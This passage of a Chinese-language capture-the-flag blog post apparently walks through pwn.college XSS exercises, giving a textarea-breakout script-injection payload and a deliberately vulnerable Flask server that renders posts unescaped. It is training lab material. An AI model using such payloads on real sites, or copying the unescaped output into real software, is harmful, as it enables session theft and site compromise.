class="comment"># 如果没有提供 URL 参数，则输出使用方法</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)  <span class="comment"># 退出程序，状态码为 1 表示错误</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析提供的 URL</span></span><br><span class="line">challenge_url = sys.argv[<span class="number">1</span>]  <span class="comment"># 获取命令行中传入的 URL</span></span><br><span class="line">url_parsed = urllib.parse.urlparse(challenge_url)  <span class="comment"># 使用 urllib 解析 URL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 URL 的主机名是否为 &quot;challenge.localhost&quot;，确保我们正在访问正确的主机</span></span><br><span class="line"><span class="keyword">if</span> url_parsed.hostname != <span class="string">&quot;challenge.localhost&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hostname should be &#x27;challenge.localhost&#x27;.&quot;</span>)  <span class="comment"># 如果主机名不正确，则提示错误</span></span><br><span class="line">    sys.exit(<span class="number">2</span>)  <span class="comment"># 退出程序，状态码为 2 表示错误</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 URL 的端口号是否为 80</span></span><br><span class="line"><span class="keyword">if</span> url_parsed.port <span class="keyword">not</span> <span class="keyword">in</span> &#123;<span class="literal">None</span>, <span class="number">80</span>&#125;:  <span class="comment"># 如果没有指定端口，或者端口不是 80，抛出错误</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Port should be 80.&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">3</span>)  <span class="comment"># 退出程序，状态码为 3 表示错误</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出将要访问的 URL，并使用 Selenium 浏览器访问该 URL</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Visiting <span class="subst">&#123;challenge_url&#125;</span>&quot;</span>)</span><br><span class="line">browser.get(challenge_url)  <span class="comment"># 打开给定的 URL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 显式等待，等待页面中弹出 JavaScript alert 对话框</span></span><br><span class="line">    WebDriverWait(browser, <span class="number">1</span>).until(EC.alert_is_present())  <span class="comment"># 等待最多 1 秒，直到 alert 弹出</span></span><br><span class="line"><span class="keyword">except</span> TimeoutException:</span><br><span class="line">    <span class="comment"># 如果超过等待时间仍未弹出 alert，则输出错误信息并退出程序</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Failure: JavaScript alert did not trigger...&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">3</span>)  <span class="comment"># 退出程序，状态码为 3 表示错误</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># 如果 alert 成功弹出，说明 JavaScript 被执行了</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Alert triggered! Your reward:&quot;</span>)</span><br><span class="line">    <span class="comment"># 输出 /flag 文件中的内容（通常是用于验证的 flag）</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read())  <span class="comment"># 打开 /flag 文件并读取内容，输出 flag</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-17-XSS-4"><a href="#3-17-XSS-4" class="headerlink" title="3.17 XSS 4"></a>3.17 XSS 4</h3><p>这个任务要求我们在<code>&lt;textarea name=msg&gt;&#123;flask.request.args.get(&quot;msg&quot;, &quot;Type your message here!&quot;)&#125;&lt;/textarea&gt;</code>中注入<code>&lt;script&gt;alert(&#39;PWNED&#39;)&lt;/script&gt;</code>，原理和之前类似，直接通过使用匹配注释掉对应的标签就可以了。</p>
<p>解决办法为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/challenge/victim <span class="string">&quot;http://challenge.localhost/?msg=&lt;/textarea&gt;&lt;script&gt;alert(&#x27;PWNED&#x27;)&lt;/script&gt;&lt;textarea&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-17-XSS-5"><a href="#3-17-XSS-5" class="headerlink" title="3.17 XSS 5"></a>3.17 XSS 5</h3><p>server代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 Flask 应用</span></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 临时数据库类，用于创建临时数据库文件</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemporaryDB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 创建一个临时数据库文件，带有 .db 后缀</span></span><br><span class="line">        self.db_file = tempfile.NamedTemporaryFile(<span class="string">&quot;x&quot;</span>, suffix=<span class="string">&quot;.db&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 执行 SQL 语句</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, sql, parameters=(<span class="params"></span>)</span>):</span><br><span class="line">        <span class="comment"># 连接到临时数据库文件</span></span><br><span class="line">        connection = sqlite3.connect(self.db_file.name)</span><br><span class="line">        <span class="comment"># 设置行工厂以返回字典格式的数据</span></span><br><span class="line">        connection.row_factory = sqlite3.Row</span><br><span class="line">        cursor = connection.cursor()</span><br><span class="line">        <span class="comment"># 执行 SQL 语句</span></span><br><span class="line">        result = cursor.execute(sql, parameters)</span><br><span class="line">        <span class="comment"># 提交更改</span></span><br><span class="line">        connection.commit()</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果程序以 root 权限运行，读取实际 flag 文件，否则使用虚拟 flag</span></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read().strip() <span class="keyword">if</span> os.geteuid() == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&quot;pwn.college&#123;fake_flag&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建临时数据库实例</span></span><br><span class="line">db = TemporaryDB()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个包含管理员未发布的草稿帖子的表</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE posts AS SELECT ? AS content, &quot;admin&quot; AS author, FALSE AS published&quot;&quot;&quot;</span>, [flag])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个用户表，其中包含管理员和其密码</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE users AS SELECT &quot;admin&quot; AS username, ? as password&quot;&quot;&quot;</span>, [flag])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向用户表中添加其他用户</span></span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;INSERT INTO users SELECT &quot;guest&quot; as username, &quot;password&quot; as password&quot;&quot;&quot;</span>)</span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;INSERT INTO users SELECT &quot;hacker&quot; as username, &quot;1337&quot; as password&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录路由，处理 POST 请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_login</span>():</span><br><span class="line">    <span class="comment"># 获取提交的用户名和密码</span></span><br><span class="line">    username = flask.request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    password = flask.request.form.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">    <span class="comment"># 如果缺少用户名或密码参数，返回 400 错误</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `username` form parameter&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> password:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `password` form parameter&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 验证用户名和密码是否匹配数据库中的用户</span></span><br><span class="line">    user = db.execute(<span class="string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>, (username, password)).fetchone()</span><br><span class="line">    <span class="comment"># 如果用户不存在，则返回 403 错误</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Invalid username or password&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将用户名存储在会话中，以保持用户登录状态</span></span><br><span class="line">    flask.session[<span class="string">&quot;username&quot;</span>] = username</span><br><span class="line">    <span class="keyword">return</span> flask.redirect(<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建草稿帖子的路由，处理 POST 请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/draft&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_draft</span>():</span><br><span class="line">    <span class="comment"># 检查用户是否登录</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> flask.session:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Log in first!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取帖子内容</span></span><br><span class="line">    content = flask.request.form.get(<span class="string">&quot;content&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment"># 将新草稿插入到 posts 表中</span></span><br><span class="line">    db.execute(</span><br><span class="line">        <span class="string">&quot;INSERT INTO posts (content, author, published) VALUES (?, ?, ?)&quot;</span>,</span><br><span class="line">        (content, flask.session.get(<span class="string">&quot;username&quot;</span>), <span class="built_in">bool</span>(flask.request.form.get(<span class="string">&quot;publish&quot;</span>)))</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> flask.redirect(<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发布帖子的路由，处理 GET 请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/publish&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_publish</span>():</span><br><span class="line">    <span class="comment"># 检查用户是否登录</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> flask.session:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Log in first!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将当前用户的草稿状态更新为已发布</span></span><br><span class="line">    db.execute(<span class="string">&quot;UPDATE posts SET published = TRUE WHERE author = ?&quot;</span>, [flask.session.get(<span class="string">&quot;username&quot;</span>)])</span><br><span class="line">    <span class="keyword">return</span> flask.redirect(<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主页面的路由，显示登录表单或用户界面</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    <span class="comment"># 页面内容初始化</span></span><br><span class="line">    page = <span class="string">&quot;&lt;html&gt;&lt;body&gt;\nWelcome to pwnpost, now with users!&lt;hr&gt;\n&quot;</span></span><br><span class="line">    username = flask.session.get(<span class="string">&quot;username&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 如果用户已登录，显示发布和草稿选项</span></span><br><span class="line">    <span class="keyword">if</span> username:</span><br><span class="line">        page += <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;form action=draft method=post&gt;</span></span><br><span class="line"><span class="string">              Post:&lt;textarea name=content&gt;Write something!&lt;/textarea&gt;</span></span><br><span class="line"><span class="string">              &lt;input type=checkbox name=publish&gt;Publish</span></span><br><span class="line"><span class="string">              &lt;input type=submit value=Save&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;&lt;br&gt;&lt;a href=publish&gt;Publish your drafts!&lt;/a&gt;&lt;hr&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 显示所有帖子</span></span><br><span class="line">        <span class="keyword">for</span> post <span class="keyword">in</span> db.execute(<span class="string">&quot;SELECT * FROM posts&quot;</span>).fetchall():</span><br><span class="line">            page += <span class="string">f&quot;&quot;&quot;&lt;h2&gt;Author: <span class="subst">&#123;post[<span class="string">&quot;author&quot;</span>]&#125;</span>&lt;/h2&gt;&quot;&quot;&quot;</span></span><br><span class="line">            <span class="comment"># 显示已发布的内容或草稿的前12个字符</span></span><br><span class="line">            <span class="keyword">if</span> post[<span class="string">&quot;published&quot;</span>]:</span><br><span class="line">                page += post[<span class="string">&quot;content&quot;</span>] + <span class="string">&quot;&lt;hr&gt;\n&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                page += <span class="string">f&quot;&quot;&quot;(Draft post, showing first 12 characters):&lt;br&gt;<span class="subst">&#123;post[<span class="string">&quot;content&quot;</span>][:<span class="number">12</span>]&#125;</span>&lt;hr&gt;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 如果用户未登录，显示登录表单</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page += <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;form action=login method=post&gt;</span></span><br><span class="line"><span class="string">              Username:&lt;input type=text name=username&gt;</span></span><br><span class="line"><span class="string">              Password:&lt;input type=text name=password&gt;</span></span><br><span class="line"><span class="string">              &lt;input type=submit name=submit value=Login&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;&lt;hr&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page + <span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 Flask 的密钥，用于加密会话信息</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line"><span class="comment"># 设置服务器的名称</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:80&quot;</span></span><br><span class="line"><span class="comment"># 运行 Flask 应用</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, <span class="number">80</span>)</span><br></pre></td></tr></table></figure>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2024/06/08/ember-code-analysis/" rel="prev" title="ember-code-analysis">
      <i class="fa fa-chevron-left"></i> ember-code-analysis
    </a></div>
      <div class="post-nav-item">
    <a href="/2024/06/24/malware-classification/" rel="next" title="malware-classification">
      malware-classification <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Intro-to-Cybersecurity"><span class="nav-number">1.</span> <span class="nav-text">Intro to Cybersecurity</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-Building-a-Web-Server"><span class="nav-number">1.1.</span> <span class="nav-text">1. Building a Web Server</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-Program-that-exits"><span class="nav-number">1.1.1.</span> <span class="nav-text">1.1 Program that exits</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-Program-that-creates-a-socket"><span class="nav-number">1.1.2.</span> <span class="nav-text">1.2 Program that creates a socket</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-Program-that-binds-a-socket"><span class="nav-number">1.1.3.</span> <span class="nav-text">1.3 Program that binds a socket</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-Program-that-listens-on-a-socket"><span class="nav-number">1.1.4.</span> <span class="nav-text">1.4 Program that listens on a socket</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-Program-that-accepts-a-connection"><span class="nav-number">1.1.5.</span> <span class="nav-text">1.5 Program that accepts a connection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-6-Program-that-statically-responds-to-an-HTTP-request"><span class="nav-number">1.1.6.</span> <span class="nav-text">1.6 Program that statically responds to an HTTP request</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-7-Program-that-dynamically-responds-to-an-HTTP-GET-request"><span class="nav-number">1.1.7.</span> <span class="nav-text">1.7 Program that dynamically responds to an HTTP GET request</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-7-Program-that-dynamically-responds-to-multiple-HTTP-GET-requests"><span class="nav-number">1.1.8.</span> <span class="nav-text">1.7 Program that dynamically responds to multiple HTTP GET requests</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-9-Multi-processed-program-that-dynamically-responds-to-multiple-HTTP-GET-requests"><span class="nav-number">1.1.9.</span> <span class="nav-text">1.9 Multi-processed program that dynamically responds to multiple HTTP GET requests</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-10-and-1-11-Multi-processed-program-that-dynamically-responds-to-multiple-HTTP-POST-GETrequests"><span class="nav-number">1.1.10.</span> <span class="nav-text">1.10 and 1.11 Multi-processed program that dynamically responds to multiple HTTP POST GETrequests</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Intercepting-Communication"><span class="nav-number">1.2.</span> <span class="nav-text">2. Intercepting Communication</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Connect-to-a-remote-host"><span class="nav-number">1.2.1.</span> <span class="nav-text">2.1 Connect to a remote host</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Listen-for-a-connection-from-a-remote-host"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.2 Listen for a connection from a remote host</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-Find-and-connect-to-a-remote-host"><span class="nav-number">1.2.3.</span> <span class="nav-text">2.3 Find and connect to a remote host</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-Find-and-connect-to-a-remote-host-on-a-large-network"><span class="nav-number">1.2.4.</span> <span class="nav-text">2.4 Find and connect to a remote host on a large network</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-Monitor-traffic-from-a-remote-host"><span class="nav-number">1.2.5.</span> <span class="nav-text">2.5 Monitor traffic from a remote host</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-Monitor-slow-traffic-from-a-remote-host"><span class="nav-number">1.2.6.</span> <span class="nav-text">2.6 Monitor slow traffic from a remote host</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-7-Hijack-traffic-from-a-remote-host-by-configuring-your-network-interface"><span class="nav-number">1.2.7.</span> <span class="nav-text">2.7 Hijack traffic from a remote host by configuring your network interface</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-8-Manually-send-an-Ethernet-packet"><span class="nav-number">1.2.8.</span> <span class="nav-text">2.8 Manually send an Ethernet packet</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-9-Manually-send-an-Internet-Protocol-packet"><span class="nav-number">1.2.9.</span> <span class="nav-text">2.9 Manually send an Internet Protocol packet</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-10-Manually-send-a-Transmission-Control-Protocol-packet"><span class="nav-number">1.2.10.</span> <span class="nav-text">2.10 Manually send a Transmission Control Protocol packet</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-11-Manually-perform-a-Transmission-Control-Protocol-handshake"><span class="nav-number">1.2.11.</span> <span class="nav-text">2.11 Manually perform a Transmission Control Protocol handshake</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-12-Manually-send-an-Address-Resolution-Protocol-packet"><span class="nav-number">1.2.12.</span> <span class="nav-text">2.12 Manually send an Address Resolution Protocol packet</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-13-Hijack-traffic-from-a-remote-host-using-ARP"><span class="nav-number">1.2.13.</span> <span class="nav-text">2.13 Hijack traffic from a remote host using ARP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-14-Man-in-the-middle-traffic-between-two-remote-hosts-and-inject-extra-traffic"><span class="nav-number">1.2.14.</span> <span class="nav-text">2.14 Man-in-the-middle traffic between two remote hosts and inject extra traffic</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-Web-Security"><span class="nav-number">1.3.</span> <span class="nav-text">3 Web Security</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-PATH-Traversal-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">3.1 PATH Traversal 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-Path-Traversal-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">3.2 Path Traversal 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-CMDi-1"><span class="nav-number">1.3.3.</span> <span class="nav-text">3.3 CMDi 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-CMDi-2"><span class="nav-number">1.3.4.</span> <span class="nav-text">3.4 CMDi 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-5-CMDi-3"><span class="nav-number">1.3.5.</span> <span class="nav-text">3.5 CMDi 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-6-CMDi-4"><span class="nav-number">1.3.6.</span> <span class="nav-text">3.6 CMDi 4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-7-CMDi-5"><span class="nav-number">1.3.7.</span> <span class="nav-text">3.7 CMDi 5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-8-CMDi-6"><span class="nav-number">1.3.8.</span> <span class="nav-text">3.8 CMDi 6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-8-Authentication-Bypass-1"><span class="nav-number">1.3.9.</span> <span class="nav-text">3.8 Authentication Bypass 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-9-Authentication-Bypass-2"><span class="nav-number">1.3.10.</span> <span class="nav-text">3.9 Authentication Bypass 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-9-SQLi-1"><span class="nav-number">1.3.11.</span> <span class="nav-text">3.9 SQLi 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-10-SQLi-2"><span class="nav-number">1.3.12.</span> <span class="nav-text">3.10 SQLi 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-11-SQLi-3"><span class="nav-number">1.3.13.</span> <span class="nav-text">3.11 SQLi 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-12-SQLi-4"><span class="nav-number">1.3.14.</span> <span class="nav-text">3.12 SQLi 4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-13-SQLi-5"><span class="nav-number">1.3.15.</span> <span class="nav-text">3.13 SQLi 5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-14-XSS-1"><span class="nav-number">1.3.16.</span> <span class="nav-text">3.14 XSS 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-15-XSS-2"><span class="nav-number">1.3.17.</span> <span class="nav-text">3.15 XSS 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-16-XSS-3"><span class="nav-number">1.3.18.</span> <span class="nav-text">3.16 XSS 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-17-XSS-4"><span class="nav-number">1.3.19.</span> <span class="nav-text">3.17 XSS 4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-17-XSS-5"><span class="nav-number">1.3.20.</span> <span class="nav-text">3.17 XSS 5</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="theLonging"
      src="/images/touxiang.JPG">
  <p class="site-author-name" itemprop="name">theLonging</p>
  <div class="site-description" itemprop="description">不捨晝夜。</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">43</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/chantchanH7" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chantchanH7" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
